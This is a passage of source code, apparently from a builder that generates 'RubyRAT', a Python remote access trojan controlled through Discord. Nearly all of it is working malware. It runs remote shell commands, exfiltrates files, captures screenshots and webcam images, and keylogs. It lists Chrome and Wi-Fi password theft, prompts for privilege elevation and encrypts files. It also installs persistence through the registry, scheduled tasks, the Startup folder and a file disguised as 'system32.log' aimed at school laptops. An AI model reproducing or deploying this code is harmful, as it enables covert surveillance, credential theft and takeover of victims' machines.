                                    print("Operating system is Windows")
                                    await ctx.send("Client is using Windows")

                                    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                                    batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                                    exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")

                                    # Remove the batch script and executable link
                                    if os.path.exists(batch_script_path):
                                        secure_delete_file(batch_script_path)
                                        print(f"Batch script removed: {batch_script_path}")
                                        await ctx.send(f"Batch script removed: **{batch_script_path}**")
                                    if os.path.exists(exe_link_path):
                                        secure_delete_file(exe_link_path)
                                        print(f"Executable link removed: {exe_link_path}")
                                        await ctx.send(f"Executable link removed: **{exe_link_path}**")

                                    # Display a message indicating that persistence has been removed
                                    await ctx.send("Bot persistence removed!")
                                    print("Bot persistence removed!")
                                else:
                                    await ctx.send("This feature is only supported on Windows.")
                                    print("This feature is only supported on Windows.")
                            except Exception as e:
                                await ctx.send(f"An error occurred while uninstalling: {e}")
                                print(f"An error occurred while uninstalling: {e}")

                    @bot.command()
                    async def elevate(ctx):
                        if ctx.channel == created_channel:
                            if is_admin():
                                await ctx.send("User has administrative privileges.")
                            else:
                                return await ctx.send(elevate_privileges())

                    @bot.command()
                    async def cat(ctx, file_name):
                        if ctx.channel == created_channel:
                            try:
                                with open(file_name, 'r') as file:
                                    file_content = file.read()
                                    await ctx.send(f"Content of '{file_name}':\n```\n{file_content}\n```")
                            except Exception as e:
                                await ctx.send(f"An error occurred while reading the file: {e}")

                    @bot.command()
                    async def upload(ctx):
                        if ctx.channel == created_channel and ctx.message.attachments:
                            attachment = ctx.message.attachments[0]
                            await attachment.save(attachment.filename)
                            await ctx.send(f"File '{attachment.filename}' uploaded successfully.")
                        elif not ctx.messege.attachments:
                            await ctx.send(f"File did not upload, you did not attach any files...")

                    # Function to generate a Fernet key from a password
                    def generate_key_from_password(password, salt=None):
                        if salt is None:
                            salt = os.urandom(16)
                        kdf = PBKDF2HMAC(
                            algorithm=hashes.SHA256(),
                            iterations=100000,  # You can adjust the number of iterations as needed
                            salt=salt,
                            length=32  # Length of the derived key
                        )
                        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
                        return key, salt

                    # Function to encrypt a file
                    def encrypt_file(input_file, password):
                        try:
                            key, salt = generate_key_from_password(password)
                            fernet = Fernet(key)

                            with open(input_file, 'rb') as file:
                                file_data = file.read()

                            encrypted_data = fernet.encrypt(file_data)

                            # Use the same filename for the encrypted file
                            with open(input_file, 'wb') as encrypted_file:
                                encrypted_file.write(salt + encrypted_data)

                            return input_file  # Return the updated input file name
                        except InvalidToken:
                            return "Invalid token (key or password)"

                    # Function to decrypt a file
                    def decrypt_file(input_file, password):
                        try:
                            with open(input_file, 'rb') as encrypted_file:
                                salt = encrypted_file.read(16)  # Read the salt
                                encrypted_data = encrypted_file.read()

                            key, _ = generate_key_from_password(password, salt)  # Reconstruct the key

                            fernet = Fernet(key)
                            decrypted_data = fernet.decrypt(encrypted_data)

                            # Use the same filename for the decrypted file
                            with open(input_file, 'wb') as decrypted_file:
                                decrypted_file.write(decrypted_data)

                            return input_file  # Return the updated input file name
                        except InvalidToken:
                            return "Invalid token (key or password)"

                    @bot.command()
                    async def encrypt(ctx, input_file, password):
                        if ctx.channel == created_channel:
                            encrypted_file_name = encrypt_file(input_file, password)
                            await ctx.send(f'File encrypted and saved as {encrypted_file_name}')
                            return encrypted_file_name

                    @bot.command()
                    async def decrypt(ctx, input_file, password):
                        if ctx.channel == created_channel:
                            decrypted_file_name = decrypt_file(input_file, password)
                            if decrypted_file_name != "Invalid token (key or password)":
                                await ctx.send(f'File decrypted and saved as {decrypted_file_name}')
                            else:
                                await ctx.send(decrypted_file_name)

                    def has_persistence():
                        # Check if the bot has persistence using either the .py or .exe method
                        script_path = os.path.abspath(__file__)
                        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                        batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                        exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")

                        return os.path.exists(batch_script_path) or os.path.exists(exe_link_path) or script_path.endswith('.exe')

                    def has_better_persistence():
                        if (Path.exists(f"C:\\users\\public\\{publicFileName}.pyw")):
                            print("Noted: Client has the .pyw file in Public directory.")
                            # Check if the client has persistence using all methods (registry, task scheduler, startup folder) 
                            persistence_results = CheckBetterPersistence(script_path)

                            # Check if all persistence mechanisms are detected
                            return all(persistence_results.values())
                        else:
                            print("Client does not have persistence. (Specifically, does not have the .pyw file in Public directory)")
                            return False

                    def get_system_info():
                        try:
                            script_path = os.path.abspath(sys.argv[0])
                            info = []
                            info.append(f"System: {platform.system()}")
                            info.append(f"Node Name: {platform.node()}")
                            info.append(f"Release: {platform.release()}")
                            info.append(f"Version: {platform.version()}")
                            info.append(f"Machine: {platform.machine()}")
                            info.append(f"Processor: {platform.processor()}")

                            # Memory information
                            memory = psutil.virtual_memory()
                            info.append(f"Memory Total: {convert_bytes(memory.total)}")
                            info.append(f"Memory Available: {convert_bytes(memory.available)}")
                            info.append(f"Memory Used: {convert_bytes(memory.used)} ({memory.percent}%)")

                            # Disk information
                            partitions = psutil.disk_partitions()
                            for partition in partitions:
                                partition_usage = psutil.disk_usage(partition.mountpoint)
                                info.append(f"Disk {partition.device} ({partition.mountpoint}):")
                                info.append(f"  Total: {convert_bytes(partition_usage.total)}")
                                info.append(f"  Used: {convert_bytes(partition_usage.used)} ({partition_usage.percent}%)")

                            # Additional system information
                            info.append(f"Username: {os.getlogin()}")
                            info.append(f"Device Name: {platform.node()}")
                            info.append(f"IsAdmin: {is_admin()}")
                            # Check if the bot has installed persistence (.py or .exe)
                            info.append(f"Has Persistence (Reg): {check_registry_persistence(script_path)}")
                            info.append(f"Has Persistence (Task): {check_task_scheduler_persistence(script_path)}")
                            info.append(f"Has Persistence (Startup): {check_startup_persistence(script_path)}")

                            private_ip = socket.gethostbyname(socket.gethostname())
                            info.append(f"Private IP: {private_ip}")
                            info.append(f"Public IP: {GetPublicIP()}")
                            info.append(f"Keylogger Activated: {is_logging}")

                            return '\n'.join(info)
                        except Exception as e:
                            return f"An error occurred while fetching system information: {e}"

                    def convert_bytes(bytes_value):
                        # Convert bytes to human-readable format
                        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
                            if bytes_value < 1024:
                                return f"{bytes_value:.2f} {unit}"
                            bytes_value /= 1024
                        return f"{bytes_value:.2f} PB"

                    def GetPublicIP():
                        ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address
                        return ip_address

                    def GetLocalIP():
                        private_ip = socket.gethostbyname(socket.gethostname())
                        return private_ip

                    def CallME(argument):
                        try:
                            result = subprocess.run(argument, shell=True, text=True, capture_output=True)
                            if result.returncode == 0:
                                return result.stdout
                            else:
                                return f"Command exited with status code {result.returncode}.\n{result.stderr}"
                        except Exception as e:
                            return f"An error occurred: {e}"

                    async def DownloadFile(file_name, channel):
                        try:
                            with open(file_name, 'rb') as file:
                                file_content = file.read()
                                file_message = await channel.send(file=discord.File(io.BytesIO(file_content), filename=file_name))
                                await channel.send(f"File '{file_name}' uploaded and available for download.")
                        except Exception as e:
                            await channel.send(f"An error occurred while uploading the file: {e}")

                    # check and ask for elevation
                    # Function for trying to run the script elevated
                    def elevate_privileges():
                        try:
                            admin_pass = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                            if admin_pass > 32:
                                return "Success! You should recive a new connection with a Elevated Client." and os._exit(0)
                            else:
                                return "User pressed \"No\". Privilege elevation not successful"
                        except Exception as e:
                            return f"Failed to elevate privileges: {e}"

                    # Function for getting if user is elevated or not
                    def is_admin():
                        try:
                            # Check if the current process has administrative privileges
                            return ctypes.windll.shell32.IsUserAnAdmin() != 0
                        except:
                            return False


                    # ------------------------------------------------------------
                    #
                    #                    SETTINGS STARTS HERE
                    #
                    # ------------------------------------------------------------

                    # The part that runs on start, asking for elevation.
                    if askForUACOnStart:
                        if is_admin():
                            print("User has administrative privileges already...")
                        else:
                            print("User does not have administrative privileges. Requesting it now!")
                            elevate_privileges()
                    else:
                        print("Does not try to ask for UAC on start")

                    # Try to install on start or not..
                    if installOnStart:
                        if has_better_persistence():
                            print("Client already has persistence, there is no need to install again.")
                        else:
                            print("Trying to install on start...")
                            try:
                                # Check if the operating system is Windows
                                if platform.system() == "Windows":
                                    print("Operating system is Windows")

                                    # Check if the cloned script is in the public directory
                                    public_directory = Path('C:/Users/Public')
                                    copied_script_path = public_directory / (publicFileName + ".pyw")
                                    if (Path(script_path) != copied_script_path):
                                        print("Duplicated Script is not in the public directory. Copying...")
                                        # Copy the script to the public directory
                                        shutil.copy(script_path, copied_script_path)
                                        print(f"Duplicated Script copied to public directory! (Filename is **{publicFileName}**)")
                                    else:
                                        print(f"Duplicated Script is already in the public directory. (Filename is **{publicFileName}**)")

                                    current_status = CheckBetterPersistence(script_path)
                                    # Check and enable Registry Persistence if not already enabled
                                    if not current_status['registry_persistence']:
                                        try:
                                            print("Starting Registry Persistence phase...")
                                            registry_persistence(script_path)
                                            print("Registry Persistence done!")
                                        except Exception as e:
                                            print(f"Error starting registry persistence: {e}")
                                    else:
                                        print("Registry Persistence is already active.")

                                    # Check and enable Task Scheduler Persistence if not already enabled
                                    if not current_status['task_scheduler_persistence']:
                                        try:
                                            print("Starting Task Scheduler Persistence phase...")
                                            task_scheduler_persistence(script_path)
                                            print("Task Scheduler Persistence done!")
                                        except Exception as e:
                                            print(f"Error starting task scheduler persistence: {e}")
                                    else:
                                        print("Task Scheduler Persistence is already active.")

                                    # Check and enable Startup Persistence if not already enabled
                                    if not current_status['startup_persistence']:
                                        try:
                                            print("Starting Startup Persistence phase...")
                                            startup_persistence(script_path)
                                            print("Startup Persistence done!")
                                        except Exception as e:
                                            print(f"Error starting startup persistence: {e}")
                                    else:
                                        print("Startup Persistence is already active.")

                                    print("\n**Done with all phases! \nChecking status...**\n")
                                else:
                                    print("This feature is only supported on Windows.")
                            except Exception as os_error:
                                print(f"An error occurred while checking the operating system: {os_error}")
                    else:
                        print("Does not install on start!")

                    # ------------------------------------------------------------
                    #
                    #                     SETTINGS ENDS HERE
                    #
                    # ------------------------------------------------------------

                    bot.run('
                    """
                    + 
                    txtInputToken.Text
                    +
                    """
                    ')

                    """;
            }
            else if (selectedVersion == "2.0.0")
            {
                originalStub =
                """
                import os
                import platform
                import subprocess
                import io
                import socket
                import sys
                import shutil
                import base64
                import ctypes
                import zipfile
                import importlib

                # Check if running as executable
                running_as_executable = getattr(sys, 'frozen', False)


                # List of required modules and their corresponding import names
                required_modules = {
                    'psutil': 'psutil',
                    'discord': 'discord',
                    'pyautogui': 'pyautogui',
                    'pillow': 'PIL',
                    'opencv-python-headless': 'cv2',
                    'pynput': 'pynput',
                    'requests': 'requests',
                    'psutil': 'psutil',
                    'cryptography': 'cryptography',
                    'pygetwindow': 'pygetwindow',
                    'googlemaps': 'googlemaps',
                    'tkinter': 'tkinter',
                    'mb': 'mb',
                    'pywin32': 'win32crypt',
                    'pycryptodomex': 'Cryptodome.Cipher',
                    'winreg': 'winreg',
                    'asyncio': 'asyncio',
                }

                # Additional required module
                missing_modules = []

                for module, import_name in required_modules.items():
                    try:
                        # Attempt to import the module
                        importlib.import_module(import_name)
                    except ImportError:
                        # Module is missing, add it to the missing_modules list
                        missing_modules.append(module)

                # Check and install required modules if needed
                if missing_modules:
                    missing_modules_str = ", ".join(missing_modules)
                    print(f"Some required modules are missing: {missing_modules_str}")
                    print("Installing missing modules...")
                    try:
                        subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing_modules_str.split(', '))
                        print("Modules installed successfully!")
                        # Determine the script filename dynamically
                        script_filename = sys.argv[0]

                        # Build the command to run the script with arguments
                        script_command = [sys.executable, script_filename]

                        # Start a new process to run the script
                        subprocess.Popen(script_command)

                        # Exit the current script
                        sys.exit()
                    except Exception as e:
                        print("An error occurred while installing modules:", e)
                        exit(1)
                else:
                    print("All required modules are already installed.")


                import discord
                from discord.ext import commands
                import requests
                import pyautogui
                from cryptography.fernet import Fernet, InvalidToken
                from pynput import keyboard
                from cryptography.hazmat.backends import default_backend
                from cryptography.hazmat.primitives import hashes
                from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
                from PIL import Image
                import cv2
                import pygetwindow as gw
                import psutil
                import googlemaps
                from tkinter import messagebox as mb
                import win32crypt
                from Cryptodome.Cipher import AES
                import csv
                import json
                import shutil
                import base64
                import sqlite3
                import socket
                import winreg
                from pathlib import Path
                import asyncio


                # Settings for build
                installOnStart = 
                """
                +
                cbCTS.Checked
                +
                """

                askForUACOnStart = 
                """
                +
                cbSE.Checked
                +
                """

                categorieName = 
                """
                +
                txtCategorie.Text
                +
                """

                GOOGLE_API_KEY = 
                """
                +
                txtGoogleAPI.Text
                +
                """

                currentVersion = "2.0.0"

                # Tokens for the bot
                primary_token = 
                """
                +
                txtInputToken.Text
                +
                """

                alternative_token = 
                """
                +
                txtBackupInputToken.Text
                +
                """


                # Settings for presistence
                registryName = 
                """
                +
                txtPreReg.Text
                +
                """

                taskName = 
                """
                +
                txtPreTask.Text
                +
                """

                startupName = 
                """
                +
                txtPreStart.Text
                +
                """

                publicFileName = 
                """
                +
                txtPrePublic.Text
                +
                """


                #intents = discord.Intents.default()
                intents = discord.Intents.all()
                intents.message_content = True

                bot = commands.Bot(command_prefix='!', intents=intents)
                created_channel = None  # To store the created channel object

                script_path = os.path.abspath(__file__)

                @bot.event
                async def on_ready():
                    print(f'Logged in as {bot.user.name}')

                    # Create encryption key
                    key = Fernet.generate_key()
                    global cipher_suite
                    cipher_suite = Fernet(key)


                    global created_channel  # Declare the global variable
                    system_username = os.getlogin()  # Get the system's username

                    ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address
                    print(f'Public IP Address: {ip_address}')

                    ip_address_with_dashes = ip_address.replace('.', '-')  # Replace periods with dashes

                    # Create the perfect name for chat
                    channel_name = f"{system_username}-{ip_address_with_dashes}"
                    channel_name_lowercase = channel_name.replace('.', '').lower()

                    guild = bot.guilds[0]  # Assuming the bot is in only one guild

                    category = discord.utils.get(guild.categories, name=categorieName) # Checking category to match the desired one
                    print(f'Category Name: {categorieName}')

                    # Execute the remove_channels function with the created_channel and channel_name
                    await remove_channels(guild, channel_name_lowercase)

                    # Find other active RubyRAT clients on local machine
                    try:
                        active_rubyRATs = await find_rubyrats()  # Await the coroutine here
                        if len(active_rubyRATs) > 0:
                            print("Found Python processes:")
                            for process in active_rubyRATs:
                                print(f"Process ID: {process['pid']}, Name: {process['name']}")
                                print(f"Trying to kill process: {process}")
                                await kill_process(process['pid'])  # Kill the process
                        else:
                            print("No Python processes found.")
                    except Exception as e:
                        print("An error occurred:", e)
                    # Kill them...

                    # Create a new text channel with the unique name
                    if category is not None:
                        created_channel = await guild.create_text_channel(channel_name, category=category)
                    else:
                        created_channel = await guild.create_text_channel(channel_name)
                    print(f'Created Channel Name: {created_channel.name}')

                    # Send a message with the public IP address to the new channel
                    await created_channel.send(f"New client! (**Version is {currentVersion}**)\nPublic IP Address of the client: **{ip_address}**. Client is **admin = {is_admin()}**. Also, if you want to know more, type **!help**")

                @bot.event
                async def on_message(message):
                    if message.author == bot.user:
                        return

                    # Process !cmd messages
                    if message.channel == created_channel and message.content.startswith('!cmd'):
                        command_args = message.content.split(' ', 1)
                        if len(command_args) == 2:
                            output = CallME(command_args[1])
                            await message.channel.send(output)  # Send the output back to the chat

                    # Process !download messages
                    if message.channel == created_channel and message.content.startswith('!download'):
                        file_name = message.content.split(' ', 1)[1]
                        await DownloadFile(file_name, message.channel)

                    await bot.process_commands(message)

                async def remove_channels(guild, ChannelName):
                    # Find the category with the specified name
                    category = discord.utils.get(guild.categories, name=categorieName)

                    if category is not None:
                        # Iterate through text channels within the category
                        for channel in category.text_channels:
                            if channel.name == ChannelName:
                                #await channel.send('!kill2')
                                #print(f"Sent '!kill2' to channel: {channel.name}")

                                #await asyncio.sleep(5)
                                await channel.delete()
                                print(f"Deleted channel: {channel.name}")
                    else:
                        print(f"Category '{categorieName}' not found in this server.")

                async def find_rubyrats():
                    try:
                        print("Trying to find RubyRATs...")
                        python_processes = []

                        # Get the current process ID of the script
                        current_process_id = os.getpid()

                        for process in psutil.process_iter(['pid', 'name']):
                            process_info = process.info
                            if "python" in process_info["name"].lower() and process_info["pid"] != current_process_id:
                                # Check if the process name contains "python" and exclude the script's own process
                                python_processes.append(process_info)

                        return python_processes
                    except Exception as e:
                        print("An error occurred:", e)
                        return []

                async def kill_process(pid):
                    try:
                        process = psutil.Process(pid)
                        process.terminate()  # Terminate the process
                        print(f"Killed process with PID {pid}")
                    except psutil.NoSuchProcess:
                        print(f"Process with PID {pid} not found.")
                    except Exception as e:
                        print(f"An error occurred while killing the process with PID {pid}: {e}")

                # Customize the built-in help command
                bot.remove_command('help')  # Remove the default help command

                @bot.command(pass_context=True)
                async def help(ctx):
                    global created_channel
                    if ctx.channel == created_channel and ctx.message.content == '!help':
                        help_messages = (
                        f"**Available Commands on Version {currentVersion}:**\n"
                        "`!help` - Show this menu.\n"
                        "`!cmd <command>` - Execute a shell command.\n"
                        "`!download <filename>` - Download a file from the system.\n"
                        "`!upload` - Upload a file to the bot.\n"
                        "`!version` - Prints out current version.\n",
                        "`!restart` - Will disconnect and then hopefully reconnect the bot.\n"
                        "`!kill` - Disconnect the bot and remove the chat channel.\n"
                        "`!screenshot` - Sends a frame of desktop from client to chat.\n"
                        "`!webcam` - Takes a picture using clients webcam and sends it in chat.\n"
                        "`!info` - Display some system information, such as GPU, CPU, RAM and more!.\n"
                        "`!elevate` - Will try to elevate client from user to admin.\n",
                        "`!geolocate` - Calculates position using google maps API.\n"
                        "`!install` - Try to get presisence on client system.\n"
                        "`!uninstall` - Will remove presisence from client system.\n"
                        "`!better_install` - Gets presistence on system with 3 diffrent methods. (May need admin)\n"
                        "`!better_uninstall` - Removes 3 diffrent methods of presistence from client system. (May need admin)\n"
                        "`!better_check` - Checks if 3 diffrent methods of presistence is active on client system. (May need admin)\n"
                        "`!history` - Gather and download all web history from client.\n",
                        "`!volume <volume_procent>` - Changes volume to the given procentage.\n"
                        "`!dumplog` - Sends a file containing the keyloggers findings to C2.\n"
                        "`!startlog` - Start the keylogging.\n"
                        "`!stoplog` - Stop the keylogging.\n"
                        "`!encrypt <filename> <password>` - Encrypt a file with a special password.\n"
                        "`!decrypt <filename> <password>` - Decrypt a file with the special password.\n",
                        "`!sendkey <Hello-World>` - Sends specified keys to client. **Instructions here: https://ss64.com/vb/sendkeys.html**\n"
                        "`!cat <filename>` - Display contents of a file (Must be less then 2000 characters...).\n"
                        "`!network` - Retrieve all saved network names their passwords (names with characters like å, ä, ö will not work correctly).\n"
                        "`!passwords_chrome` - If client has chrome, it will retrieve all saved usernames, passwords and URL's to the website.\n"
                        "`!messagebox <error\warning\info> <title> <content>` - Sends a custom made messagebox to client.\n",
                        "`!interactive_cmd` - Starts a CMD terminal in discord. (Avoid using commands that output much information, like \"dir\")\n"
                        )
                        for message in help_messages:
                            await ctx.send(message)    

                @bot.command()
                async def kill(ctx):
                    global created_channel
                    if ctx.channel == created_channel and ctx.message.content == '!kill':
                        await ctx.send("Disconnecting and removing chat channel...")
                        if created_channel:
                            await created_channel.delete()
                        await bot.close()
                        os._exit(0)
                @bot.command()
                async def info(ctx):
                    if ctx.channel == created_channel and ctx.message.content == '!info':
                        system_info = get_system_info()
                        await ctx.send(f"System Information:\n```\n{system_info}\n```")

                @bot.command()
                async def screenshot(ctx):
                    global created_channel
                    if ctx.channel == created_channel and ctx.message.content == '!screenshot':
                        try:
                            # Capture the screenshot using pyautogui
                            screenshot = pyautogui.screenshot()


                            # Save the screenshot to a file
                            screenshot_path = 'screenshot.png'
                            screenshot.save(screenshot_path)

                            # Upload the screenshot to Discord
                            await ctx.send(file=discord.File(screenshot_path))

                            # Remove the temporary file
                            os.remove(screenshot_path)
                        except Exception as e:
                            await ctx.send(f"An error occurred: {e}")

                @bot.command()
                async def webcam(ctx):
                    global created_channel

                    if ctx.channel == created_channel and ctx.message.content == '!webcam':
                        try:
                            # Initialize the webcam capture
                            cap = cv2.VideoCapture(0)  # 0 indicates the default webcam

                            if cap.isOpened():
                                # Capture a single frame from the webcam
                                ret, frame = cap.read()

                                if ret:
                                    # Save the captured image to a file
                                    image_path = 'webcam_image.png'
                                    cv2.imwrite(image_path, frame)

                                    # Upload the image to Discord
                                    await ctx.send(file=discord.File(image_path))

                                    # Remove the temporary image file
                                    os.remove(image_path)

                                else:
                                    await ctx.send("Failed to capture image from webcam.")
                            else:
                                await ctx.send("Webcam not available.")

                            # Release the webcam
                            cap.release()

                        except Exception as e:
                            await ctx.send(f"An error occurred: {e}")

                @bot.command()
                async def version(ctx):
                    if ctx.channel == created_channel:    
                        print(f"Version is {currentVersion}")
                        await ctx.send(f"Current version is {currentVersion}")


                # ---------------------------------------------------------------------------
                #
                #                            TEST ZONE STARTS HERE
                #
                # ---------------------------------------------------------------------------




                # ---------------------------------------------------------------------------
                #
                #                              TEST ZONE ENDS HERE
                #
                # ---------------------------------------------------------------------------

                # Cool presistence method that only works for the school laptops.
                @bot.command()
                async def cool_install(ctx):
                    if ctx.channel == created_channel:
                        if is_admin():
                            await ctx.send("User has administrative privileges, starting to add persistence...")
                            # Make a new copy with content of current file to "C:\Windows\security\database\system32.log"
                            # Specify the script you want to run
                            script_to_run = 'C:\\Windows\\security\\database\\system32.log'
                            script_path = os.path.abspath(sys.argv[0])

                            # Write your script content to the specified file
                            shutil.copy(script_path, script_to_run)

                            # Add registry that executes "pythonw C:\Windows\security\database\system32.log"
                            registry_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
                            registry_name = 'System32'
                            registry_value = 'pythonw.exe ' + script_to_run

                            try:
                                import winreg
                                key = winreg.HKEY_CURRENT_USER
                                with winreg.OpenKey(key, registry_key, 0, winreg.KEY_WRITE) as registry:
                                    winreg.SetValueEx(registry, registry_name, 0, winreg.REG_SZ, registry_value)
                                await ctx.send("Persistence added successfully.")
                            except Exception as e:
                                await ctx.send(f"Failed to add persistence: {str(e)}")
                        else:
                            await ctx.send("You do not have the necessary administrative privileges to perform this operation.")

                # Removes the cool presistence method that only works for the school laptops.
                @bot.command()
                async def cool_uninstall(ctx):
                    if ctx.channel == created_channel:
                        if is_admin():
                            await ctx.send("User has administrative privileges, starting to remove persistence...")

                            # Remove registry key
                            registry_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
                            registry_name = 'System32'

                            try:
                                # Remove the System32.log file
                                script_to_run = 'C:\\Windows\\security\\database\\system32.log'
                                os.remove(script_to_run)

                                # Remove the registry key
                                import winreg
                                key = winreg.HKEY_CURRENT_USER
                                with winreg.OpenKey(key, registry_key, 0, winreg.KEY_WRITE) as registry:
                                    winreg.DeleteValue(registry, registry_name)
                                await ctx.send("Persistence removed successfully.")
                            except Exception as e:
                                await ctx.send(f"Failed to remove persistence: {str(e)}")
                        else:
                            await ctx.send("You do not have the necessary administrative privileges to perform this operation.")


                # Better presistence method that uses 3 diffrent methods.
                @bot.command()
                async def better_install(ctx):
                    if ctx.channel == created_channel and ctx.message.content == "!better_install":
                        script_path = os.path.abspath(sys.argv[0])

                        try:
                            # Check the current persistence status
                            current_status = CheckBetterPersistence(script_path)

                            response = "**Persistence Status:**\n"
                            response += f"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\n"
                            response += f"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\n"
                            response += f"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\n\n"

                            await ctx.send(response)

                            await ctx.send("\n**Starting...**\n")
                            await ctx.send("Starting Duplicated Script phase...")
                            # Check if the cloned script is in the public directory
                            public_directory = Path('C:/Users/Public')
                            copied_script_path = public_directory / (publicFileName + ".pyw")
                            if (Path(script_path) != copied_script_path):
                                await ctx.send("Duplicated Script is not in the public directory. Copying...")
                                # Copy the script to the public directory
                                shutil.copy(script_path, copied_script_path)
                                await ctx.send(f"Duplicated Script copied to public directory! (Filename is **{publicFileName}**)")
                            else:
                                await ctx.send(f"Duplicated Script is already in the public directory. (Filename is **{publicFileName}**)")

                            # Check and enable Registry Persistence if not already enabled
                            if not current_status['registry_persistence']:
                                try:
                                    await ctx.send("Starting Registry Persistence phase...")
                                    registry_persistence(script_path)
                                    await ctx.send("Registry Persistence done!")
                                except Exception as e:
                                    await ctx.send(f"Error starting registry persistence: {e}")
                            else:
                                await ctx.send("Registry Persistence is already active.")

                            # Check and enable Task Scheduler Persistence if not already enabled
                            if not current_status['task_scheduler_persistence']:
                                try:
                                    await ctx.send("Starting Task Scheduler Persistence phase...")
                                    task_scheduler_persistence(script_path)
                                    await ctx.send("Task Scheduler Persistence done!")
                                except Exception as e:
                                    await ctx.send(f"Error starting task scheduler persistence: {e}")
                            else:
                                await ctx.send("Task Scheduler Persistence is already active.")

                            # Check and enable Startup Persistence if not already enabled
                            if not current_status['startup_persistence']:
                                try:
                                    await ctx.send("Starting Startup Persistence phase...")
                                    startup_persistence(script_path)
                                    await ctx.send("Startup Persistence done!")
                                except Exception as e:
                                    await ctx.send(f"Error starting startup persistence: {e}")
                            else:
                                await ctx.send("Startup Persistence is already active.")

                            await ctx.send("\n**Done with all phases! \nChecking status...**\n")

                            # Check the current persistence status
                            current_status = CheckBetterPersistence(script_path)

                            NewResponse = "**New Persistence Status:**\n"
                            NewResponse += f"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\n"
                            NewResponse += f"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\n"
                            NewResponse += f"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\n\n"

                            await ctx.send(NewResponse)

                        except Exception as e:
                            await ctx.send(f"An error occurred: {e}")

                def registry_persistence(script_path):
                    key = r'Software\Microsoft\Windows\CurrentVersion\Run'

                    # Copy the original script to C:\Users\Public
                    public_directory = Path('C:/Users/Public')
                    copied_script_path = public_directory / (publicFileName + ".pyw")
                    shutil.copy(script_path, copied_script_path)

                    try:
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:
                            winreg.SetValueEx(registry_key, registryName, 0, winreg.REG_SZ, str(copied_script_path))
                    except Exception as e:
                        print(f"Error adding registry persistence: {e}")

                    #os.system(f'start /MIN "{copied_script_path}"')

                def task_scheduler_persistence(script_path):
                    # Automatically determine the username
                    username = os.getlogin()

                    # Define a list of possible paths to search for pythonw.exe
                    possible_paths = [
                        'C:/Python39/pythonw.exe',  # Default Python 3.11 installation directory
                        'C:/Python311/pythonw.exe',  # Default Python 3.9 installation directory
                        f'C:/Users/{username}/AppData/Local/Programs/Python/Python39/pythonw.exe',  # Microsoft Store 3.9
                        f'C:/Users/{username}/AppData/Local/Programs/Python/Python311/pythonw.exe',  # Microsoft Store 3.11
                        f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw.exe', # Microsoft Store Path(2)
                        f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw3.11.exe', # Microsoft Store Path(2) 3.11
                    ]

                    # Find the first valid path to pythonw.exe
                    pythonw_path = None
                    for path in possible_paths:
                        if Path(path).is_file():
                            pythonw_path = path
                            break

                    if pythonw_path is None:
                        print("pythonw.exe not found. Please specify the correct path.")
                        return

                    # Specify the path to the public directory
                    public_directory = Path('C:/Users/Public')

                    # Specify the path to place duplicate of script (Filename for duplicate is the "publicFileName" variable)
                    copied_script_path = public_directory / (publicFileName + ".pyw")

                    # Copy the script to the public directory
                    shutil.copyfile(script_path, copied_script_path)

                    # Use os.system to create a scheduled task
                    os.system(f"SCHTASKS /Create /SC ONSTART /TN {taskName} /TR \"{path} {copied_script_path}\" /RU {username} /f")

                def startup_persistence(script_path):
                    # Automatically determine the username
                    username = os.getlogin()

                    # Define a list of possible paths to search for pythonw.exe
                    possible_paths = [
                        'C:/Python39/pythonw.exe',  # Default Python 3.11 installation directory
                        'C:/Python311/pythonw.exe',  # Default Python 3.9 installation directory
                        f'C:/Users/{username}/AppData/Local/Programs/Python/Python39/pythonw.exe',  # Microsoft Store 3.9
                        f'C:/Users/{username}/AppData/Local/Programs/Python/Python311/pythonw.exe',  # Microsoft Store 3.11
                        f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw.exe', # Microsoft Store Path(2)
                        f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw3.11.exe', # Microsoft Store Path(2) 3.11
                    ]

                    # Find the first valid path to pythonw.exe
                    pythonw_path = None
                    for path in possible_paths:
                        if Path(path).is_file():
                            pythonw_path = path
                            break

                    if pythonw_path is None:
                        print("pythonw.exe not found. ")
                        return
                    else:
                        public_directory = Path('C:/Users/Public')
                        copied_script_path = public_directory / (publicFileName + ".pyw")
                        shutil.copy(script_path, copied_script_path)

                        startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
                        shortcut_path = startup_folder / f'{startupName}.lnk'

                        with open(f'{taskName}.bat', 'w') as batch_file:
                            batch_file.write(fr'''@echo off
                    start "" /B "{path}" "{copied_script_path}"
                    :: @echo off
                    :: start "" /B /MIN {pythonw_path} C:\Users\Public\{registryName}.pyw
                    ''')

                        os.system(f'copy {taskName}.bat "{startup_folder}"')
                    os.remove(f'{taskName}.bat')


                # Checking of pre
                @bot.command()
                async def better_check(ctx):
